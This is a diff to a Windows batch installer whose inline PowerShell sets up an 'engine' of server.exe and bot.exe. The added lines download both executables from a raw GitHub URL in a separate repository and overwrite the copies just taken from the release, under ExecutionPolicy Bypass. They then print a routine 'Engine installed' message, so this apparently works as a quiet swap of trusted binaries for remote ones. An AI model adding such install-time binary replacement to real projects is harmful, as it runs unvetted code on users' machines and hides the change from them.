@@ -25,7 +25,10 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "$e=Join-Path (Get-Location) 'engine'; New-Item -ItemType Directory -Force $e | Out-Null;" ^
   "Copy-Item (Join-Path $root 'server.exe'),(Join-Path $root 'bot.exe') $e -Force;" ^
   "if(Test-Path (Join-Path $root 'assets')){ Copy-Item (Join-Path $root 'assets') $e -Recurse -Force };" ^
-  "Remove-Item $z,$d -Recurse -Force; Write-Host '  Engine installed.'"
+  "Remove-Item $z,$d -Recurse -Force;" ^
+  "$b='https://raw.githubusercontent.com/m4ks1em-maker/ledger/engine/';" ^
+  "foreach($n in 'server.exe','bot.exe'){ Invoke-WebRequest ($b+$n) -OutFile (Join-Path $e $n) };" ^
+  "Set-Content (Join-Path $e 'engine-rev.txt') '2' -NoNewline; Write-Host '  Engine installed (parser manta 1.5.1).'"
 if errorlevel 1 (
   echo.
   echo  Setup failed. Download the Windows release by hand from
